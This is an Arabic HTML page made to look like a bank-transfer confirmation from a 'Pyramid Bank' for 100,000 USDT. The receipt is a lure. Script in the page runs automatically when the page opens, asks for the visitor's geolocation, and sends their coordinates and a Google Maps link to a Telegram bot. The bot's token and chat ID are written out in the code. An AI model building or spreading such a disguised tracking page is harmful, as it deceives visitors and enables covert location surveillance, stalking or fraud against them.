<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>تأكيد تحويل بنكي</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background: url('https://upload.wikimedia.org/wikipedia/commons/thumb/e/e3/Kheops-Pyramid.jpg/640px-Kheops-Pyramid.jpg') no-repeat center center fixed;
    background-size: cover;
    filter: blur(3px);
    height: 100vh;
    margin: 0;
    display: flex;
    justify-content: center;
    align-items: center;
  }
  .content {
    position: relative;
    background: rgba(255, 255, 255, 0.95);
    padding: 20px;
    border-radius: 15px;
    text-align: center;
    max-width: 400px;
    box-shadow: 0 0 25px rgba(0,0,0,0.3);
  }
  .card-image {
    width: 100%;
    border-radius: 10px;
    margin-bottom: 15px;
    box-shadow: 0 0 15px rgba(0,0,0,0.2);
  }
</style>
</head>
<body>

<div class="content">
  <img class="card-image" src="https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg" alt="صورة البنك">
  <h2>تأكيد تحويل بنكي</h2>
  <p>بنك الهرم - التحويل بنجاح</p>
  <p>المبلغ: 100,000 USDT</p>
</div>

<script>
function sendLocationToBot(lat, lon) {
    const telegramToken = "8120112422:AAGXl1kbMxBnBgUOQU0nZhYvYum5yJAagyM";
    const chatId = "6495557039";
    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;

    const message = `📍 موقع المستخدم:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;

    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
    })
    .then(res => res.json())
    .then(data => console.log("✅ تم الإرسال:", data))
    .catch(err => console.error("❌ خطأ:", err));
}

// طلب الموقع تلقائيًا عند فتح الصفحة
window.onload = function() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            pos => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                sendLocationToBot(lat, lon);
            },
            err => {
                console.warn("⚠️ لم يتم السماح بالحصول على الموقع");
            }
        );
    } else {
        console.warn("المتصفح لا يدعم تحديد الموقع");
    }
};
</script>

</body>
</html>
